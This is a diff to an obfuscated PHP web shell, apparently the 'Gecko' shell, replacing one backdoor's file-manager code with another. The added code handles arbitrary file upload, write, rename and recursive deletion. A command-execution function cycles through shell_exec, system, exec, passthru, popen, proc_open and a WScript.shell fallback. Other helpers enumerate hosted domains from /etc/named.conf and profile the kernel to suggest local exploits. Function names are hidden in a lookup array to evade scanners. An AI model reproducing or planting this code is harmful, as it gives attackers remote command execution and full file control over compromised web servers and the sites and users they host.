+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['upload-submit'])) {
+    $name_file = $_FILES['gecko-file']['name'];
+    $tmp_name = $_FILES['gecko-file']['tmp_name'];
+    $move = MoVe_UpLoAdEd_FiLe($tmp_name, $fungsi[9]() . "/" . $name_file);
+    if ($move) {
+        echo success();
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['submit-rename'])) {
+    $new_name = $_POST['rename'];
+    $re_name = rename($fungsi[9]() . "/" . $_GET['rename'], $new_name);
+    if ($re_name) {
+        echo success();
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['submit-file'])) {
+    $textarea = $_POST['text-file'];
+    $write = $fungsi[28]($fungsi[9]() . "/" . $_GET['f'], $textarea);
+    if ($write) {
+        echo success();
+    } else {
+        echo failed();
+    }
+}
+
+
+
+if (isset($_POST['gecko-submit'])) {
+    $item = $_POST['check-gecko'];
+    if ($_POST['action-gecko'] == "delete") {
+        foreach ($item as $it) {
+            $repl = str_replace("\\", "/", $fungsi[9]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if ($fungsi[18]($fd) || $fungsi[17]($fd)) {
+                $rmdir = unlinkDir($fd);
+                $rmfile = $fungsi[30]($fd);
+                if ($rmdir || $rmfile) {
+                    echo success();
+                } else {
+                    echo failed();
+                }
+            }
         }
     }
 }
 
-echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr class="first">
-<td><center>Na'.'me</center></td>
-<td><center>Si'.'ze</center></td>
-<td><center>Las'.'t Mo'.'dif'.'ied</center></td>
-<td><center>Owner / Group</center></td>
-<td><center>Pe'.'rmi'.'ss'.'ions</center></td>
-<td><center>Op'.'tio'.'ns</center></td>
-</tr>';
-
-echo "<tr>";
-$euybrekw = $srl($bsn($lokasi), "", $lokasi);
-$euybrekw = $srl("//", "/", $euybrekw);
-echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybrekw."\">..</a></td>
-<td><center>--</center></td>
-<td><center>".fdt($euybrekw)."</center></td>
-<td><center>".gor($euybrekw)." / ".ggr($euybrekw)."</center></td>
-<td><center>";
-if($isw($euybrekw)) echo '<font color="green">';
-elseif(!$isr($euybrekw)) echo '<font color="red">';
-echo statusnya($euybrekw);
-if($isw($euybrekw) || !$isr($euybrekw)) echo '</font>';
-echo "</center></td>
-<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
-<input type=\"hidden\" name=\"type\" value=\"dir\">
-<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
-<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
-<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
-</form></center>";
-echo "</tr>";
-
-foreach($lokasinya as $ppkcina){
-	$euybre = $lokasi."/".$ppkcina;
-	$euybre = $srl("//", "/", $euybre);
-	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
-	echo "<tr>";
-	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybre."\">".$ppkcina."</a></td>
-	<td><center>--</center></td>
-	<td><center>".fdt($euybre)."</center></td>
-	<td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>
-	<td><center>";
-	if($isw($euybre)) echo '<font color="green">';
-	elseif(!$isr($euybre)) echo '<font color="red">';
-	echo statusnya($euybre);
-	if($isw($euybre) || !$isr($euybre)) echo '</font>';
-
-	echo "</center></td>
-	<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
-	<input type=\"hidden\" name=\"type\" value=\"dir\">
-	<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
-	<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
-	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
-	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
-	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
-	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
-	</form></center></td>
-	</tr>";
+function success()
+{
+    return '<meta http-equiv="refresh" content="0;url=?dir=' . hex($GLOBALS['fungsi'][9]()) . '&response=success">';
+}
+function failed()
+{
+    return '<meta http-equiv="refresh" content="0;url=?dir=' . hex($GLOBALS['fungsi'][9]()) . '&response=failed">';
 }
 
-echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
-$skd = "10"."24";
-foreach($lokasinya as $mekicina) {
-	$euybray = $lokasi."/".$mekicina;
-	if(!$ifi("$lokasi/$mekicina")) continue;
-	$size = $fsz("$lokasi/$mekicina")/$skd;
-	$size = $rd($size,3);
-	if($size >= $skd){
-	$size = $rd($size/$skd,2).' M'.'B';
-} else {
-	$size = $size.' K'.'B';
+function _mad_cmd($de)
+{
+    $out = '';
+    try {
+        if (function_exists('shell_exec')) {
+            return @$GLOBALS['fungsi'][0]($de);
+        } else if (function_exists('system')) {
+            @$GLOBALS['fungsi'][3]($de);
+        } else if (function_exists('exec')) {
+            $exec = array();
+            @$GLOBALS['fungsi'][1]($de, $exec);
+            $out = @join("\n", $exec);
+            return $exec;
+        } else if (function_exists('passthru')) {
+            @$GLOBALS['fungsi'][2]($de);
+        } else if (function_exists('popen') && function_exists('pclose')) {
+            if (is_resource($f = @$GLOBALS['fungsi'][5]($de, "r"))) {
+                $out = "";
+                while (!@feof($f))
+                    $out .= fread($f, 1024);
+                return $out;
+                $GLOBALS['fungsi'][6]($f);
+            }
+        } else if (function_exists('proc_open')) {
+            $pipes = array();
+            $process = @$GLOBALS['fungsi'][4]($de . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
+            $out = @$GLOBALS['fungsi'][8]($pipes[1]);
+            return $out;
+        } else if (class_exists('COM')) {
+            $madWs = new COM('WScript.shell');
+            $exec = $madWs->$GLOBALS['fungsi'][1]('cmd.exe /c ' . $_POST['alfa1']);
+            $stdout = $exec->StdOut();
+            $out = $stdout->ReadAll();
+        }
+    } catch (Exception $e) {
+    }
+    return $out;
 }
 
-echo "<tr>
-<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>
-<td><center>".$size."</center></td>
-<td><center>".fdt($euybray)."</center></td>
-<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
-<td><center>";
-if($isw("$lokasi/$mekicina")) echo '<font color="green">';
-elseif(!$isr("$lokasi/$mekicina")) echo '<font color="red">';
-echo statusnya("$lokasi/$mekicina");
-if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</font>';
-echo "</center></td><td><center>
-<form method=\"post\" action=\"?pilihan&loknya=$lokasi\">
-<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-down"."load' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
-<input type=\"hidden\" name=\"type\" value=\"fi"."le\">
-<input type=\"hidden\" name=\"name\" value=\"$mekicina\">
-<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$mekicina\">
-</form></center></td>
-</tr>";
-}
-echo '</tr></td></table></table>';
-author();
 
-function statusnya($fl){
-	$a = "sub"."st"."r";
-	$b = "s"."pri"."ntf";
-	$c = "fil"."eper"."ms";
-$izin = $a($b('%o', $c($fl)), -4);
-return $izin;
+
+function unlinkDir($dir)
+{
+    $dirs = array($dir);
+    $files = array();
+    for ($i = 0;; $i++) {
+        if (isset($dirs[$i]))
+            $dir =  $dirs[$i];
+        else
+            break;
+
+        if ($openDir = opendir($dir)) {
+            while ($readDir = @readdir($openDir)) {
+                if ($readDir != "." && $readDir != "..") {
+
+                    if ($GLOBALS['fungsi'][18]($dir . "/" . $readDir)) {
+                        $dirs[] = $dir . "/" . $readDir;
+                    } else {
+
+                        $files[] = $dir . "/" . $readDir;
+                    }
+                }
+            }
+        }
+    }
+
+
+
+    foreach ($files as $file) {
+        $GLOBALS['fungsi'][30]($file);
+    }
+    $dirs = array_reverse($dirs);
+    foreach ($dirs as $dir) {
+        $GLOBALS['fungsi'][29]($dir);
+    }
+}
+
+function formatSize($bytes)
+{
+    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
+    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
+    return (round($bytes, 2) . " " . $types[$i]);
+}
+
+function symlinkDomain()
+{
+    $d0mains = @file("/etc/named.conf", false);
+    if (!$d0mains) {
+        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
+        $GLOBALS["need_to_update_header"] = "true";
+    } else {
+        $count = 0;
+        foreach ($d0mains as $d0main) {
+            if (@strstr($d0main, "zone")) {
+                preg_match_all('#zone "(.*)"#', $d0main, $domains);
+                flush();
+                if (strlen(trim($domains[1][0])) > 2) {
+                    flush();
+                    $count++;
+                }
+            }
+        }
+        $dom = "$count Domain";
+    }
+    return $dom;
+}
+
+function linux_version()
+{
+    $pecah = explode(" ", $GLOBALS['fungsi'][11]());
+    $pcah = explode("-", $pecah[2]);
+    return $pcah[0];
+}
+
+function perms($file)
+{
+    $perms = fileperms($file);
+    if (($perms & 0xC000) == 0xC000) {
+        // Socket
+        $info = 's';
+    } elseif (($perms & 0xA000) == 0xA000) {
+        // Symbolic Link
+        $info = 'l';
+    } elseif (($perms & 0x8000) == 0x8000) {
+        // Regular
+        $info = '-';
+    } elseif (($perms & 0x6000) == 0x6000) {
+        // Block special
+        $info = 'b';
+    } elseif (($perms & 0x4000) == 0x4000) {
+        // Directory
+        $info = 'd';
+    } elseif (($perms & 0x2000) == 0x2000) {
+        // Character special
+        $info = 'c';
+    } elseif (($perms & 0x1000) == 0x1000) {
+        // FIFO pipe
+        $info = 'p';
+    } else {
+        // Unknown
+        $info = 'u';
+    }
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ?
+        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ?
+        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ?
+        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+    return $info;
+}
+
+function hex($n)
+{
+    $y = '';
+    for ($i = 0; $i < strlen($n); $i++) {
+        $y .= dechex(ord($n[$i]));
+    }
+    return $y;
+}
+function unhex($y)
+{
+    $n = '';
+    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
+        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
+    }
+    return $n;
+}
+function suggest_exploit()
+{
+    $uname = $GLOBALS['fungsi'][11]();
+    $xplod = explode(" ", $uname);
+    $xpld = explode("-", $xplod[2]);
+    $pl = explode(".", $xpld[0]);
+    return $pl[0] . "." . $pl[1];
+}
+function distro_linux()
+{
+    $uname = $GLOBALS['fungsi'][11]();
+    $xplod = explode(" ", $uname);
+    return $xplod[6];
+}
+function kernel_angka()
+{
+    $uname = $GLOBALS['fungsi'][11]();
+    $xplod = explode(" ", $uname);
+    $xpld = explode("-", $xplod[2]);
+    return $xpld[0];
+}
+function namaFile()
+{
+    $namesc = $_SERVER['SCRIPT_NAME'];
+    $expl = explode("/", $namesc);
+    return end($expl);
+}
+function awalanFile($namas)
+{
+    $namafile = $namas;
+    $pech = explode(".", $namafile);
+    return $pech[0];
+}
+function pwdnostrip()
+{
+    $pwd_exists = $GLOBALS['fungsi'][9]();
+    $xpl1 = str_replace("/", "", $pwd_exists);
+    return $xpl1;
 }
 ?>
